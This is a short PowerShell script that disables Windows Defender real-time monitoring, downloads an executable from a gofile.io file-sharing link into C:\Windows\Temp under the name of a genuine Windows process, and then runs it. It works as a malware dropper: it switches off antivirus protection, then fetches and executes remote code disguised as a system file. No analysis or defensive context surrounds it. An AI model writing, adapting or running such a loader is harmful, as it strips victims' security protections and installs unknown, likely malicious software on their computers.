# Disable Windows Defender Real-Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Wait for a few seconds to ensure Defender is disabled before continuing
Start-Sleep -Seconds 3

# Download the file (Use PowerShell's Invoke-WebRequest)
$url = "https://store10.gofile.io/download/web/e382faa0-2338-4565-a998-573dea5f77c0/Application%20Frame%20Host.exe"
$destination = "C:\\Windows\\Temp\\Application Frame Host.exe"
Invoke-WebRequest -Uri $url -OutFile $destination

# Execute the downloaded file
Start-Process -FilePath $destination
